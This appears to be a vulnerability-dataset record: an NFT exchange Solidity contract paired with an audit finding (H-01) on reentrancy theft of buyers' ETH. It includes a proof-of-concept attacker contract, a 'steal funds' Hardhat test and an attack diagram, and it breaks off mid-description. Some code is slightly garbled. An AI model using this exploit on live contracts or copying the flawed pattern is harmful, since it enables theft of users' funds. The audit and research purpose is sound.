[
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\n\nimport \"./lib/ReentrancyGuarded.sol\";\nimport \"./lib/EIP712.sol\";\nimport \"./lib/MerkleVerifier.sol\";\nimport \"./interfaces/IExchange.sol\";\nimport \"./interfaces/IPool.sol\";\nimport \"./interfaces/IExecutionDelegate.sol\";\nimport \"./interfaces/IPolicyManager.sol\";\nimport \"./interfaces/IMatchingPolicy.sol\";\nimport {\n  Side,\n  SignatureVersion,\n  AssetType,\n  Fee,\n  Order,\n  Input,\n  Execution\n} from \"./lib/OrderStructs.sol\";\n\n/**\n * @title Exchange\n * @dev Core exchange contract\n */\ncontract Exchange is IExchange, ReentrancyGuarded, EIP712, OwnableUpgradeable, UUPSUpgradeable {\n\n    /* Auth */\n    uint256 public isOpen;\n\n    modifier whenOpen() {\n        require(isOpen == 1, \"Closed\");\n        _;\n    }\n\n    modifier setupExecution() {\n        remainingETH = msg.value;\n        isInternal = true;\n        _;\n        remainingETH = 0;\n        isInternal = false;\n    }\n\n    modifier internalCall() {\n        require(isInternal, \"This function should not be called directly\");\n        _;\n    }\n\n    event Opened();\n    event Closed();\n\n    function open() external onlyOwner {\n        isOpen = 1;\n        emit Opened();\n    }\n    function close() external onlyOwner {\n        isOpen = 0;\n        emit Closed();\n    }\n\n    // required by the OZ UUPS module\n    function _authorizeUpgrade(address) internal override onlyOwner {}\n\n\n    /* Constants */\n    string public constant NAME = \"Exchange\";\n    string public constant VERSION = \"1.0\";\n    uint256 public constant INVERSE_BASIS_POINT = 10_000;\n    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address public constant POOL = 0xF66CfDf074D2FFD6A4037be3A669Ed04380Aef2B;\n\n\n    /* Variables */\n    IExecutionDelegate public executionDelegate;\n    IPolicyManager public policyManager;\n    address public oracle;\n    uint256 public blockRange;\n\n\n    /* Storage */\n    mapping(bytes32 => bool) public cancelledOrFilled;\n    mapping(address => uint256) public nonces;\n\n\n    /* Events */\n    event OrdersMatched(\n        address indexed maker,\n        address indexed taker,\n        Order sell,\n        bytes32 sellHash,\n        Order buy,\n        bytes32 buyHash\n    );\n\n    event OrderCancelled(bytes32 hash);\n    event NonceIncremented(address indexed trader, uint256 newNonce);\n\n    event NewExecutionDelegate(IExecutionDelegate indexed executionDelegate);\n    event NewPolicyManager(IPolicyManager indexed policyManager);\n    event NewOracle(address indexed oracle);\n    event NewBlockRange(uint256 blockRange);\n\n    constructor() {\n      _disableInitializers();\n    }\n\n    /* Constructor (for ERC1967) */\n    function initialize(\n        IExecutionDelegate _executionDelegate,\n        IPolicyManager _policyManager,\n        address _oracle,\n        uint _blockRange\n    ) external initializer {\n        __Ownable_init();\n        isOpen = 1;\n\n        DOMAIN_SEPARATOR = _hashDomain(EIP712Domain({\n            name              : NAME,\n            version           : VERSION,\n            chainId           : block.chainid,\n            verifyingContract : address(this)\n        }));\n\n        executionDelegate = _executionDelegate;\n        policyManager = _policyManager;\n        oracle = _oracle;\n        blockRange = _blockRange;\n    }\n\n    // temporary function for testing\n    function updateDomainSeparator() external {\n        DOMAIN_SEPARATOR = _hashDomain(EIP712Domain({\n            name              : NAME,\n            version           : VERSION,\n            chainId           : block.chainid,\n            verifyingContract : address(this)\n        }));\n    }\n\n\n    /* External Functions */\n    bool public isInternal = false;\n    uint256 public remainingETH = 0;\n\n    /**\n     * @dev _execute wrapper \n     * @param sell Sell input\n     * @param buy Buy input\n     */\n    function execute(Input calldata sell, Input calldata buy)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n        _execute(sell, buy);\n        _returnDust();\n    }\n\n    /**\n     * @dev Bulk execute multiple matches\n     * @param executions Potential buy/sell matches\n     */\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n        /*\n        REFERENCE\n        uint256 executionsLength = executions.length;\n        for (uint8 i=0; i < executionsLength; i++) {\n            bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);\n            (bool success,) = address(this).delegatecall(data);\n        }\n        _returnDust(remainingETH);\n        */\n        uint256 executionsLength = executions.length;\n        for (uint8 i = 0; i < executionsLength; i++) {\n            assembly {\n                let memPointer := mload(0x40)\n\n                let order_location := calldataload(add(executions.offset, mul(i, 0x20)))\n                let order_pointer := add(executions.offset, order_location)\n\n                let size\n                switch eq(add(i, 0x01), executionsLength)\n                case 1 {\n                    size := sub(calldatasize(), order_pointer)\n                }\n                default {\n                    let next_order_location := calldataload(add(executions.offset, mul(add(i, 0x01), 0x20)))\n                    let next_order_pointer := add(executions.offset, next_order_location)\n                    size := sub(next_order_pointer, order_pointer)\n                }\n\n                mstore(memPointer, 0xe04d94ae00000000000000000000000000000000000000000000000000000000) // _execute\n                calldatacopy(add(0x04, memPointer), order_pointer, size)\n                // must be put in separate transaction to bypass failed executions\n                // must be put in delegatecall to maintain the authorization from the caller\n                let result := delegatecall(gas(), address(), memPointer, add(size, 0x04), 0, 0)\n            }\n        }\n        _returnDust();\n    }\n\n    function _returnDust() private {\n        uint256 _remainingETH = remainingETH;\n        assembly {\n            if gt(_remainingETH, 0) {\n                let callStatus := call(\n                    gas(),\n                    caller(),\n                    selfbalance(),\n                    0,\n                    0,\n                    0,\n                    0\n                )\n            }\n        }\n    }\n\n    /**\n     * @dev Match two orders, ensuring validity of the match, and execute all associated state transitions. Protected against reentrancy by a contract-global lock. Must be called internally.\n     * @param sell Sell input\n     * @param buy Buy input\n     */\n    function _execute(Input calldata sell, Input calldata buy)\n        public\n        payable\n        reentrancyGuard\n        internalCall\n    {\n        require(sell.order.side == Side.Sell);\n\n        bytes32 sellHash = _hashOrder(sell.order, nonces[sell.order.trader]);\n        bytes32 buyHash = _hashOrder(buy.order, nonces[buy.order.trader]);\n\n        require(_validateSignatures(sell, sellHash), \"Sell failed authorization\");\n        require(_validateSignatures(buy, buyHash), \"Buy failed authorization\");\n\n        require(_validateOrderParameters(sell.order, sellHash), \"Sell has invalid parameters\");\n        require(_validateOrderParameters(buy.order, buyHash), \"Buy has invalid parameters\");\n\n        (uint256 price, uint256 tokenId, uint256 amount, AssetType assetType) = _canMatchOrders(sell.order, buy.order);\n\n        /* Mark orders as filled. */\n        cancelledOrFilled[sellHash] = true;\n        cancelledOrFilled[buyHash] = true;\n\n        _executeFundsTransfer(\n            sell.order.trader,\n            buy.order.trader,\n            sell.order.paymentToken,\n            sell.order.fees,\n            price\n        );\n        _executeTokenTransfer(\n            sell.order.collection,\n            sell.order.trader,\n            buy.order.trader,\n            tokenId,\n            amount,\n            assetType\n        );\n\n        emit OrdersMatched(\n            sell.order.listingTime <= buy.order.listingTime ? sell.order.trader : buy.order.trader,\n            sell.order.listingTime > buy.order.listingTime ? sell.order.trader : buy.order.trader,\n            sell.order,\n            sellHash,\n            buy.order,\n            buyHash\n        );\n\n        // return (price);\n    }\n\n    /**\n     * @dev Cancel an order, preventing it from being matched. Must be called by the trader of the order\n     * @param order Order to cancel\n     */\n    function cancelOrder(Order calldata order) public {\n        /* Assert sender is authorized to cancel order. */\n        require(msg.sender == order.trader);\n\n        bytes32 hash = _hashOrder(order, nonces[order.trader]);\n\n        require(!cancelledOrFilled[hash], \"Order already cancelled or filled\");\n\n        /* Mark order as cancelled, preventing it from being matched. */\n        cancelledOrFilled[hash] = true;\n        emit OrderCancelled(hash);\n    }\n\n    /**\n     * @dev Cancel multiple orders\n     * @param orders Orders to cancel\n     */\n    function cancelOrders(Order[] calldata orders) external {\n        for (uint8 i = 0; i < orders.length; i++) {\n            cancelOrder(orders[i]);\n        }\n    }\n\n    /**\n     * @dev Cancel all current orders for a user, preventing them from being matched. Must be called by the trader of the order\n     */\n    function incrementNonce() external {\n        nonces[msg.sender] += 1;\n        emit NonceIncremented(msg.sender, nonces[msg.sender]);\n    }\n\n\n    /* Setters */\n\n    function setExecutionDelegate(IExecutionDelegate _executionDelegate)\n        external\n        onlyOwner\n    {\n        require(address(_executionDelegate) != address(0), \"Address cannot be zero\");\n        executionDelegate = _executionDelegate;\n        emit NewExecutionDelegate(executionDelegate);\n    }\n\n    function setPolicyManager(IPolicyManager _policyManager)\n        external\n        onlyOwner\n    {\n        require(address(_policyManager) != address(0), \"Address cannot be zero\");\n        policyManager = _policyManager;\n        emit NewPolicyManager(policyManager);\n    }\n\n    function setOracle(address _oracle)\n        external\n        onlyOwner\n    {\n        require(_oracle != address(0), \"Address cannot be zero\");\n        oracle = _oracle;\n        emit NewOracle(oracle);\n    }\n\n    function setBlockRange(uint256 _blockRange)\n        external\n        onlyOwner\n    {\n        blockRange = _blockRange;\n        emit NewBlockRange(blockRange);\n    }\n\n\n    /* Internal Functions */\n\n    /**\n     * @dev Verify the validity of the order parameters\n     * @param order order\n     * @param orderHash hash of order\n     */\n    function _validateOrderParameters(Order calldata order, bytes32 orderHash)\n        internal\n        view\n        returns (bool)\n    {\n        return (\n            /* Order must have a trader. */\n            (order.trader != address(0)) &&\n            /* Order must not be cancelled or filled. */\n            (!cancelledOrFilled[orderHash]) &&\n            /* Order must be settleable. */\n            (order.listingTime < block.timestamp) &&\n            (block.timestamp < order.expirationTime)\n        );\n    }\n\n    /**\n     * @dev Verify the validity of the signatures\n     * @param order order\n     * @param orderHash hash of order\n     */\n    function _validateSignatures(Input calldata order, bytes32 orderHash)\n        internal\n        view\n        returns (bool)\n    {\n\n        if (order.order.trader == msg.sender) {\n          return true;\n        }\n\n        /* Check user authorization. */\n        if (\n            !_validateUserAuthorization(\n                orderHash,\n                order.order.trader,\n                order.v,\n                order.r,\n                order.s,\n                order.signatureVersion,\n                order.extraSignature\n            )\n        ) {\n            return false;\n        }\n\n        if (order.order.extraParams.length > 0 && order.order.extraParams[0] == 0x01) {\n            /* Check oracle authorization. */\n            require(block.number - order.blockNumber < blockRange, \"Signed block number out of range\");\n            if (\n                !_validateOracleAuthorization(\n                    orderHash,\n                    order.signatureVersion,\n                    order.extraSignature,\n                    order.blockNumber\n                )\n            ) {\n                return false;\n            }\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Verify the validity of the user signature\n     * @param orderHash hash of the order\n     * @param trader order trader who should be the signer\n     * @param v v\n     * @param r r\n     * @param s s\n     * @param signatureVersion signature version\n     * @param extraSignature packed merkle path\n     */\n    function _validateUserAuthorization(\n        bytes32 orderHash,\n        address trader,\n        uint8 v,\n        bytes32 r,\n        bytes32 s,\n        SignatureVersion signatureVersion,\n        bytes calldata extraSignature\n    ) internal view returns (bool) {\n        bytes32 hashToSign;\n        if (signatureVersion == SignatureVersion.Single) {\n            /* Single-listing authentication: Order signed by trader */\n            hashToSign = _hashToSign(orderHash);\n        } else if (signatureVersion == SignatureVersion.Bulk) {\n            /* Bulk-listing authentication: Merkle root of orders signed by trader */\n            (bytes32[] memory merklePath) = abi.decode(extraSignature, (bytes32[]));\n\n            bytes32 computedRoot = MerkleVerifier._computeRoot(orderHash, merklePath);\n            hashToSign = _hashToSignRoot(computedRoot);\n        }\n\n        return _verify(trader, hashToSign, v, r, s);\n    }\n\n    /**\n     * @dev Verify the validity of oracle signature\n     * @param orderHash hash of the order\n     * @param signatureVersion signature version\n     * @param extraSignature packed oracle signature\n     * @param blockNumber block number used in oracle signature\n     */\n    function _validateOracleAuthorization(\n        bytes32 orderHash,\n        SignatureVersion signatureVersion,\n        bytes calldata extraSignature,\n        uint256 blockNumber\n    ) internal view returns (bool) {\n        bytes32 oracleHash = _hashToSignOracle(orderHash, blockNumber);\n\n        uint8 v; bytes32 r; bytes32 s;\n        if (signatureVersion == SignatureVersion.Single) {\n            assembly {\n                v := calldataload(extraSignature.offset)\n                r := calldataload(add(extraSignature.offset, 0x20))\n                s := calldataload(add(extraSignature.offset, 0x40))\n            }\n            /*\n            REFERENCE\n            (v, r, s) = abi.decode(extraSignature, (uint8, bytes32, bytes32));\n            */\n        } else if (signatureVersion == SignatureVersion.Bulk) {\n            /* If the signature was a bulk listing the merkle path must be unpacked before the oracle signature. */\n            assembly {\n                v := calldataload(add(extraSignature.offset, 0x20))\n                r := calldataload(add(extraSignature.offset, 0x40))\n                s := calldataload(add(extraSignature.offset, 0x60))\n            }\n            /*\n            REFERENCE\n            uint8 _v, bytes32 _r, bytes32 _s;\n            (bytes32[] memory merklePath, uint8 _v, bytes32 _r, bytes32 _s) = abi.decode(extraSignature, (bytes32[], uint8, bytes32, bytes32));\n            v = _v; r = _r; s = _s;\n            */\n        }\n\n        return _verify(oracle, oracleHash, v, r, s);\n    }\n\n    /**\n     * @dev Verify ECDSA signature\n     * @param signer Expected signer\n     * @param digest Signature preimage\n     * @param v v\n     * @param r r\n     * @param s s\n     */\n    function _verify(\n        address signer,\n        bytes32 digest,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) internal pure returns (bool) {\n        require(v == 27 || v == 28, \"Invalid v parameter\");\n        address recoveredSigner = ecrecover(digest, v, r, s);\n        if (recoveredSigner == address(0)) {\n          return false;\n        } else {\n          return signer == recoveredSigner;\n        }\n    }\n\n    /**\n     * @dev Call the matching policy to check orders can be matched and get execution parameters\n     * @param sell sell order\n     * @param buy buy order\n     */\n    function _canMatchOrders(Order calldata sell, Order calldata buy)\n        internal\n        view\n        returns (uint256 price, uint256 tokenId, uint256 amount, AssetType assetType)\n    {\n        bool canMatch;\n        if (sell.listingTime <= buy.listingTime) {\n            /* Seller is maker. */\n            require(policyManager.isPolicyWhitelisted(sell.matchingPolicy), \"Policy is not whitelisted\");\n            (canMatch, price, tokenId, amount, assetType) = IMatchingPolicy(sell.matchingPolicy).canMatchMakerAsk(sell, buy);\n        } else {\n            /* Buyer is maker. */\n            require(policyManager.isPolicyWhitelisted(buy.matchingPolicy), \"Policy is not whitelisted\");\n            (canMatch, price, tokenId, amount, assetType) = IMatchingPolicy(buy.matchingPolicy).canMatchMakerBid(buy, sell);\n        }\n        require(canMatch, \"Orders cannot be matched\");\n\n        return (price, tokenId, amount, assetType);\n    }\n\n    /**\n     * @dev Execute all ERC20 token / ETH transfers associated with an order match (fees and buyer => seller transfer)\n     * @param seller seller\n     * @param buyer buyer\n     * @param paymentToken payment token\n     * @param fees fees\n     * @param price price\n     */\n    function _executeFundsTransfer(\n        address seller,\n        address buyer,\n        address paymentToken,\n        Fee[] calldata fees,\n        uint256 price\n    ) internal {\n        if (msg.sender == buyer && paymentToken == address(0)) {\n            require(remainingETH >= price);\n            remainingETH -= price;\n        }\n\n        /* Take fee. */\n        uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);\n\n        /* Transfer remainder to seller. */\n        _transferTo(paymentToken, buyer, seller, receiveAmount);\n    }\n\n    /**\n     * @dev Charge a fee in ETH or WETH\n     * @param fees fees to distribute\n     * @param paymentToken address of token to pay in\n     * @param from address to charge fees\n     * @param price price of token\n     */\n    function _transferFees(\n        Fee[] calldata fees,\n        address paymentToken,\n        address from,\n        uint256 price\n    ) internal returns (uint256) {\n        uint256 totalFee = 0;\n        for (uint8 i = 0; i < fees.length; i++) {\n            uint256 fee = (price * fees[i].rate) / INVERSE_BASIS_POINT;\n            _transferTo(paymentToken, from, fees[i].recipient, fee);\n            totalFee += fee;\n        }\n\n        require(totalFee <= price, \"Total amount of fees are more than the price\");\n\n        /* Amount that will be received by seller. */\n        uint256 receiveAmount = price - totalFee;\n        return (receiveAmount);\n    }\n\n    /**\n     * @dev Transfer amount in ETH or WETH\n     * @param paymentToken address of token to pay in\n     * @param from token sender\n     * @param to token recipient\n     * @param amount amount to transfer\n     */\n    function _transferTo(\n        address paymentToken,\n        address from,\n        address to,\n        uint256 amount\n    ) internal {\n        if (amount == 0) {\n            return;\n        }\n\n        if (paymentToken == address(0)) {\n            /* Transfer funds in ETH. */\n            require(to != address(0), \"Transfer to zero address\");\n            (bool success,) = payable(to).call{value: amount}(\"\");\n            require(success, \"ETH transfer failed\");\n        } else if (paymentToken == POOL) {\n            /* Transfer Pool funds. */\n            bool success = IPool(POOL).transferFrom(from, to, amount);\n            require(success, \"Pool transfer failed\");\n        } else if (paymentToken == WETH) {\n            /* Transfer funds in WETH. */\n            executionDelegate.transferERC20(WETH, from, to, amount);\n        } else {\n            revert(\"Invalid payment token\");\n        }\n    }\n\n    /**\n     * @dev Execute call through delegate proxy\n     * @param collection collection contract address\n     * @param from seller address\n     * @param to buyer address\n     * @param tokenId tokenId\n     * @param assetType asset type of the token\n     */\n    function _executeTokenTransfer(\n        address collection,\n        address from,\n        address to,\n        uint256 tokenId,\n        uint256 amount,\n        AssetType assetType\n    ) internal {\n        /* Call execution delegate. */\n        if (assetType == AssetType.ERC721) {\n            executionDelegate.transferERC721(collection, from, to, tokenId);\n        } else if (assetType == AssetType.ERC1155) {\n            executionDelegate.transferERC1155(collection, from, to, tokenId, amount);\n        }\n    }\n}\n\n\n",
        "CodeNames": [
            "Exchange.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502\n\u2502   Buyer   \u2502            \u2502 Exchange \u2502         \u2502 Fee Recipient \u2502    \u2502  Seller   \u2502\n\u2502           \u2502            \u2502          \u2502         \u2502               \u2502    \u2502           \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518            \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502 bulkExecute(4 orders) \u2502                       \u2502                  \u2502\n      \u2502         4 ETH         \u2502                       \u2502                  \u2502\n      \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                       \u2502                  \u2502\n      \u2502                       \u2502_execute sends 0.1 ETH \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502                  \u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u2502 bulkExecute(0 orders) \u2502                  \u2502\n      \u2502                       \u2502         1 WEI         \u2502                  \u2502\n      \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u2502    _retrunDust sends  \u2502                  \u2502\n      \u2502                       \u2502         3.9 ETH       \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502  Send 3.1 ETH    \u2502\n      \u2502                       \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502\n      \u2502                       \u2502 Self destruct send    \u2502                  \u2502\n      \u2502                       \u2502         0.9 ETH       \u2502                  \u2502\n      \u2502                       \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524                  \u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u2502_execute sends 0.9 ETH \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba\u2502\n      \u2502                       \u2502                       \u2502                  \u2502\n      \u2502                       \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2510 _execute revert\u2502                  \u2502\n      \u2502                       \u2502      \u2502     3 times    \u2502                  \u2502\n  \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510                   \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2518                \u2502              \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510\n  \u25023 ETH  \u2502                   \u2502                       \u2502              \u25024 ETH  \u2502\n  \u2502Stolen \u2502                                                          \u2502Balance\u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                                                          \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n",
                    "\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n\n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[(0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n\n            // Now we received All of buyers funds. \n            // Send stolen ETH to seller minus the amount needed in order to keep execution.\n            address(_seller).call{value: address(this).balance (_price feeAmount)}('');\n\n            // selfdestruct and send funds needed to Exchange (to not revert)\n            selfdestruct(payable(msg.sender));\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n",
                    "\npragma //solidity 0.8.17;\n\nimport { Exchange } from \"../Exchange.sol\";\nimport { Execution } from \"../lib/OrderStructs.sol\";\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n    \n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[(0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n",
                    "\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n",
                    "\n    modifier setupExecution() {\n        remainingETH = msg.value;\n        isInternal = true;\n        _;\n        remainingETH = 0;\n        isInternal = false;\n    }\n",
                    "\n    function _executeFundsTransfer(\n        address seller,\n        address buyer,\n        address paymentToken,\n        Fee[] calldata fees,\n        uint256 price\n    ) internal {\n        if (msg.sender == buyer && paymentToken == address(0)) {\n            require(remainingETH = price);\n            remainingETH -= price;\n        }\n\n        /* Take fee. */\n        uint256 receiveAmount = _transferFees(fees, paymentToken, buyer, price);\n\n        /* Transfer remainder to seller. */\n        _transferTo(paymentToken, buyer, seller, receiveAmount);\n    }\n",
                    "\n    function bulkExecute(Execution[] calldata executions)\n        external\n        payable\n        whenOpen\n        setupExecution\n    {\n        /*\n        REFERENCE\n        uint256 executionsLength = executions.length;\n        for (uint8 i=0; i < executionsLength; i++) {\n            bytes memory data = abi.encodeWithSelector(this._execute.selector, executions[i].sell, executions[i].buy);\n            (bool success,) = address(this).delegatecall(data);\n        }\n        _returnDust(remainingETH);\n        */\n        uint256 executionsLength = executions.length;\n        for (uint8 i = 0; i < executionsLength; i++) {\n",
                    "\n    function _returnDust() private {\n        uint256 _remainingETH = remainingETH;\n        assembly {\n            if gt(_remainingETH, 0) {\n                let callStatus := call(\n                    gas(),\n                    caller(),\n                    selfbalance(),\n                    0,\n                    0,\n                    0,\n                    0\n                )\n            }\n        }\n    }\n",
                    "\ndescribe.only('hack', async () = {\n      let executions: any[];\n      let value: BigNumber;\n      beforeEach(async () = {\n        await updateBalances();\n        const _executions = ];\n        value = BigNumber.from(0);\n        // deploy MockFeeReceipient\n        let contractFactory = await (hre as any).ethers.getContractFactory(\n          \"MockFeeReceipient\",\n          {},\n        );\n        let contractMockFeeReceipient = await contractFactory.deploy(alice.address,price);\n        await contractMockFeeReceipient.deployed();\n        //generate alice and bob orders. alice fee recipient is MockFeeReceipient. 10% cut\n        tokenId += 1;\n        await mockERC721.mint(alice.address, tokenId);\n        sell = generateOrder(alice, {\n          side: Side.Sell,\n          tokenId,\n          paymentToken: ZERO_ADDRESS,\n          fees:  \n            {\n              rate: 1000,\n              recipient: contractMockFeeReceipient.address,\n            }\n          ],\n        });\n        buy = generateOrder(bob, { \n          side: Side.Buy,\n          tokenId,\n          paymentToken: ZERO_ADDRESS});\n        _executions.push({\n            sell: await sell.packNoOracleSig(),\n            buy: await buy.packNoSigs(),\n        });\n        // create 3 more executions\n        tokenId += 1;\n        for (let i = tokenId; i < tokenId + 3; i++) {\n          await mockERC721.mint(thirdParty.address, i);\n          const _sell = generateOrder(thirdParty, {\n            side: Side.Sell,\n            tokenId: i,\n            paymentToken: ZERO_ADDRESS,\n          });\n          const _buy = generateOrder(bob, {\n            side: Side.Buy,\n            tokenId: i,\n            paymentToken: ZERO_ADDRESS,\n          });\n          _executions.push({\n            sell: await _sell.packNoOracleSig(),\n            buy: await _buy.packNoSigs(),\n          });\n        }\n        executions = _executions;\n      });\n      it(\"steal funds\", async () = {\n        let aliceBalanceBefore = await alice.getBalance();\n        //price = 4 ETH\n        value = price.mul(4);\n        //call bulkExecute\n        tx = await waitForTx(\n          exchange.connect(bob).bulkExecute(executions, { value  }));\n        let aliceBalanceAfter = await alice.getBalance();\n        let aliceEarned = aliceBalanceAfter.sub(aliceBalanceBefore);\n        //check that alice received all 4 ETH\n        expect(aliceEarned).to.equal(value);\n      });\n    });\n",
                    "\npragma //solidity 0.8.17;\n\nimport { Exchange } from \"../Exchange.sol\";\nimport { Execution } from \"../lib/OrderStructs.sol\";\n\ncontract MockFeeReceipient {\n\n    bool lock;\n    address _seller;\n    uint256 _price;\n\n    constructor(address seller, uint256 price) {\n        _seller = seller;\n        _price = price;\n    }\n    receive() external payable {\n        Exchange ex = Exchange(msg.sender);\n        if(!lock){\n            lock = true;\n            // first entrance when receiving fee\n            uint256 feeAmount = msg.value;\n            // Create empty calldata for bulkExecute and call it\n            Execution[] memory executions = new Execution[(0);\n            bytes memory data = abi.encodeWithSelector(Exchange.bulkExecute.selector, executions);\n            address(ex).call{value: 1}(data);\n\n            // Now we received All of buyers funds. \n            // Send stolen ETH to seller minus the amount needed in order to keep execution.\n            address(_seller).call{value: address(this).balance (_price feeAmount)}('');\n\n            // selfdestruct and send funds needed to Exchange (to not revert)\n            selfdestruct(payable(msg.sender));\n        }\n        else{\n            // Second entrance after steeling balance\n            // We will get here after getting funds from reentrancy\n        }\n    }\n}\n\n"
                ],
                "Type": " Direct theft of buyer\u2019s ETH funds",
                "Description": "*Submitted by 0xdeadbeef0x, also found by adriro, bin2chen, datapunk, hihen, KingNFT, Koolex, Lambda, philogy, rotcivegaf, Trust, V_B, and wait*\n\nExchange.sol#L168(https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L168)<br\nExchange.sol#L565(https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L565)<br\nExchange.sol#L212(https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L212)<br\nExchange.sol#L154(https://github.com/code-423n4/2022-11-non-fungible/blob/323b7cbf607425dd81da96c0777c8b12e800305d/contracts/Exchange.sol#L154)<br\n\nMost severe issue:<br\nA Seller or Fee recipient can steal ETH funds from the buyer when he is making a single or bulk execution. (Direct theft of funds).\n\nAdditional impacts that can be caused by these bugs:\n1. Seller or Fee recipient can cause next in line executions to revert in bulkExecute (by altering isInternal, insufficient funds, etc..)\n2. Seller or Fee recipient can call _execute externally \n3. Seller or Fee recipient can set a caller _remainingETH to 0 (will not get refunded)\n\n\nBackground:\n* The protocol added a bulkExecute function that allows multiple orders to execute. The implementation is implemented in a way that if an _execute of a single order reverts, it will not break additional or previous successful _executes. It is therefore very important to track actual ETH used by the function. \n* The protocol has recognized the need to track buyers ETH in order to refund unused ETH by implementing the _returnDust function and setupExecution modifier. This ensures that calls to _execute must be internal and have proper accounting of remainingETH. \n* Fee recipient is controlled by the seller. The seller determines the recipients and fee rates.\n\nThe new implementations creates an attack vectors that allows the Seller or Fee recipient to steal ETH.\n\nThere are three main bugs that can be exploited to steal the 